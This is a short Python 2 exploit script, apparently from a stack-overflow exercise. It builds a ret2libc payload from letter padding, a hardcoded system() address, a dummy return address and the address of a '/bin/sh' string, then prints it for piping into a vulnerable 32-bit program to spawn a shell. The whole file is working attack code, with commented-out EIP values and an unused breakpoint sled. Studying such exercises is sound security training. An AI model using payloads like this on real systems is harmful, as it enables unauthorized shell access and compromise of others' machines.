#!/usr/bin/python
import struct
import string

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

"""

Stack looks like:

args
ret addr
syscall


"""

system = struct.pack("I", 0xb7ecffb0)
ret_after_system = "AAAA"
# ret2libc + offset for /bin/sh
bin_sh = struct.pack("I", 0xb7fb63bf)
#eip = struct.pack("I", 0xbffff7c0+32)
#ret = struct.pack("I", 0x080484f9)
trap = "\xCC"*100
print padding + system + ret_after_system + bin_sh
